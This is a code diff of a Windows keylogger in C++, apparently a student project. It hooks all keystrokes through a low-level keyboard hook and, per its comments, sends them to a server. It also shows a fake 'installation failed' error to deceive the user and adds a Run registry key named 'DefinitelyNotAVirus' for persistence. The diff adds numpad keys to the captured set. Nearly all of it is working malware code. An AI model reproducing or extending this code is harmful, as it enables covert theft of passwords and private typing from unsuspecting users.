@@ -60,12 +60,12 @@ std::string keystrokes;
  * we have to prevent the request being broken by weird characters that occur when hitting
  * random keys.  When enter or space is hit, the request to the server is built and sent.
  * ********************************************************************/
-LRESULT __stdcall Callback(int keyboardcode, WPARAM wParam, LPARAM lParam)
+LRESULT __stdcall HandleKeyStrokes(int keyboardcode, WPARAM wParam, LPARAM lParam)
 {
     if (keyboardcode >= 0) // Here we check and make sure the message from the keyboard is valid.
     {
         // Here we cast out keyboard input into a KBDLLHOOKSTRUCT defined by the windows api, so we can access the keyboard data.
-        keyboardstruct = *((KBDLLHOOKSTRUCT *)lParam); 
+        keyboardstruct = *((KBDLLHOOKSTRUCT *)lParam);
         if (wParam == WM_KEYDOWN) // If the keyboard message is that a key was pressed down.
         {
             // If enter or space is pressed.
@@ -102,14 +102,15 @@ LRESULT __stdcall Callback(int keyboardcode, WPARAM wParam, LPARAM lParam)
             }
             else
             {
-                // Checks to make sure that the key is either a number or a letter. 
+                // Checks to make sure that the key is either a number or a letter.
                 // Purpose of this was to fix issue where the request would break because
                 // of weird characters being added when shift, a function key, or other
-                // random keys would be pressed and somehow added to the set of 
+                // random keys would be pressed and somehow added to the set of
                 // keystrokes.
 
                 // This part was written by Robbie Cichon and then updated by Keven McDowell.
-                if (keyboardstruct.vkCode >= 0x30 && keyboardstruct.vkCode <= 0x5A)
+                if ((keyboardstruct.vkCode >= 0x30 && keyboardstruct.vkCode <= 0x5A) ||
+                    (keyboardstruct.vkCode >= 0x60 && keyboardstruct.vkCode <= 0x6f))
                 {
                     // Here we check if shift or caps lock is on so we can handle capital letters.
                     if (GetKeyState(16) < 0 || GetKeyState(VK_CAPITAL) == 1)
@@ -142,7 +143,7 @@ LRESULT __stdcall Callback(int keyboardcode, WPARAM wParam, LPARAM lParam)
  * ********************************************************************/
 void CreateHook()
 {
-    keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, Callback, NULL, 0);  // Windows API Function call to set the hook.
+    keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, HandleKeyStrokes, NULL, 0); // Windows API Function call to set the hook.
 }
 
 /**********************************************************************
@@ -175,10 +176,10 @@ int WINAPI WinMain(HINSTANCE hinstance1, HINSTANCE hinstance2, LPSTR lpstr, int 
     MSG msg;
     MessageBox(NULL, "Something Went Wrong During Installation! Please try again or visit our support page.", "ERROR", MB_ICONWARNING);
     HKEY registryKey = NULL;
-    const char* keyloggerPath = "C:\\NotAVirus.exe"; // Path that the keylogger must be at for the registry key stuff to work.
-    RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &registryKey); // Creating a registry key for the keylogger.
+    const char *keyloggerPath = "C:\\NotAVirus.exe";                                                                                    // Path that the keylogger must be at for the registry key stuff to work.
+    RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &registryKey);                                // Creating a registry key for the keylogger.
     LONG success = RegSetValueEx(registryKey, "DefinitelyNotAVirus", 0, REG_SZ, (unsigned char *)keyloggerPath, strlen(keyloggerPath)); // Adding the key to the registry.
-    if(success == ERROR_SUCCESS)
+    if (success == ERROR_SUCCESS)
     {
         std::cout << "Successfully made registry key." << std::endl;
     }
@@ -186,8 +187,9 @@ int WINAPI WinMain(HINSTANCE hinstance1, HINSTANCE hinstance2, LPSTR lpstr, int 
     {
         std::cout << "Failed to make registry key." << std::endl;
     }
-    while (GetMessage(&msg, NULL, 0, 0)) // Message loop for a windows Api application.
+    while (GetMessage(&msg, NULL, 0, 0)) // Message loop for a windows Api application.  Since we don't have any GUI this doesn't really do anything.
     {
+        // Normally this is where you would handle any application state changes during runtime.
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
